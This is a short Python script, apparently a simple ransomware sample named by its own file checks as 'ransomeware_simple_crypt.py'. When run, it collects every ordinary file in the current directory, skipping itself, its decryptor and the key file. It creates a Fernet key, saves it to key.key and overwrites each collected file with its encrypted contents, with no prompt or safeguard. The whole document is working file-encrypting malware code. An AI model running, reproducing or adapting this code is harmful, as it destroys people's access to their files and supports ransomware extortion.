import os
from cryptography.fernet import Fernet

list_files = []

def get_files():
    global list_files
    for file in os.listdir():
        if file == "ransomeware_simple_crypt.py" or file == "key.key":
            continue
        if file == "ransomeware_simple_decrypt.py":
            continue
        if os.path.isfile(file):
            list_files.append(file)
    print(list_files)


def generate_key():
    key = Fernet.generate_key()
    return key

def record_key(keys):
    with open("key.key","wb") as key:
        key.write(keys)

def crypto_all_files(keys):
    global list_files
    key = keys
    for files in list_files:
        with open(files,"rb") as file:
            read = file.read()
        read_crypto = Fernet(key).encrypt(read)
        with open(files,"wb") as file:
            file.write(read_crypto)

get_files()
key = generate_key()
record_key(key)
crypto_all_files(key)
